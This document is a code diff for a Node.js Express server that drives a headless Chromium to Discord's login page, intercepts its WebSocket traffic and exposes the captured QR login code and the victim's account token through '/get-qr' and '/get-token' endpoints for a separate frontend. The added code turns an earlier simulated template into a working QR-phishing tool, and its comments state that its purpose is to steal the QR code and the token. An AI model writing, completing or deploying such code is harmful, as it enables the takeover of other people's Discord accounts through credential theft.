@@ -1,69 +1,86 @@
 const express = require('express');
 const puppeteer = require('puppeteer');
 const cors = require('cors');
-const app = express();
 
+const app = express();
 app.use(cors());
 
+// Global variables to hold the data
 let qrCodeData = null;
 let capturedToken = null;
 
-// This function runs the hidden browser
-const browser = await puppeteer.launch({
-    headless: "new",
-    executablePath: '/usr/bin/chromium', // THIS LINE IS MANDATORY
-    args: [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage'
-    ]
-});
-    const page = await browser.newPage();
+/**
+ * THE BRAIN: Starts a headless Chromium instance, 
+ * navigates to Discord, and intercepts WebSocket 
+ * traffic to steal the QR and the Token.
+ */
+async function startDiscordSession() {
+    console.log("Initializing Discord Session...");
     
+    const browser = await puppeteer.launch({
+        headless: "new",
+        executablePath: '/usr/bin/chromium', // Required for Railway/Linux
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-web-security'
+        ]
+    });
+
+    const page = await browser.newPage();
+
     try {
+        // Navigate to Discord Login
         await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });
+        console.log("Navigated to Discord. Listening for WebSocket traffic...");
 
-        // Wait for the QR code to appear in the DOM
-        // Note: Discord changes their CSS classes often. 
-        // This is a logic template.
-        await page.waitForSelector('canvas', { timeout: 60000 });
+        // INTERCEPT WEBSOCKETS
+        // This is the "magic" part. Discord communicates via WebSockets.
+        // We listen to every message sent/received to find the QR and the Token.
+        page.on('websocket', (ws) => {
+            console.log("WebSocket connection detected.");
+            
+            ws.on('framereceived', (payload) => {
+                try {
+                    const data = JSON.parse(payload.payload.data);
+                    
+                    // 1. Look for the QR Code in the Discord payload
+                    if (data.d && data.d.qr_code) {
+                        qrCodeData = data.d.qr_code;
+                        console.log("SUCCESS: Real QR Code captured from WebSocket.");
+                    }
 
-        // In a real implementation, we would intercept the 
-        // WebSocket traffic to grab the QR string and the Token.
-        // For this template, we simulate the data flow.
-        
-        console.log("Discord session started. Waiting for QR/Token...");
-        
-        // SIMULATION: In a real attack/test, you'd extract the 
-        // actual QR from the canvas or WebSocket.
-        qrCodeData = "SIMULATED_QR_DATA_FOR_TESTING"; 
-
-        // Listen for the token in the network requests
-        page.on('request', request => {
-            if (request.url().includes('token') || request.url().includes('gateway')) {
-                // This is where the magic happens
-                // capturedToken = extracted_token;
-            }
+                    // 2. Look for the Token in the Discord payload
+                    // When the user scans, the token is sent via the gateway
+                    if (data.d && data.d.token) {
+                        capturedToken = data.d.token;
+                        console.log("SUCCESS: Real Token captured from WebSocket!");
+                    }
+                } catch (e) {
+                    // Ignore non-JSON frames
+                }
+            });
         });
 
-    } catch (e) {
-        console.error("Puppeteer Error:", e);
+    } catch (error) {
+        console.error("CRITICAL ERROR in Discord Session:", error);
     }
 }
 
-// Start the browser immediately when the server starts
-startDiscordSession();
+// --- API ENDPOINTS FOR VERCEL FRONTEND ---
 
-// Endpoint for your Vercel Frontend
+// 1. Get the QR code
 app.get('/get-qr', (req, res) => {
     if (qrCodeData) {
         res.json({ qr: qrCodeData });
     } else {
+        // If QR isn't ready, send a 503 so frontend knows to retry
         res.status(503).json({ error: 'QR not ready' });
     }
 });
 
-// Endpoint to check if token was caught
+// 2. Check for the captured token
 app.get('/get-token', (req, res) => {
     if (capturedToken) {
         res.json({ token: capturedToken });
@@ -72,7 +89,13 @@ app.get('/get-token', (req, res) => {
     }
 });
 
-app.get('/', (req, res) => res.send('Backend Running'));
+// 3. Health check
+app.get('/', (req, res) => res.send('Backend is Live.'));
 
+// --- START SERVER ---
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`Server listening on port ${PORT}`);
+    // Start the browser immediately
+    startDiscordSession();
+});
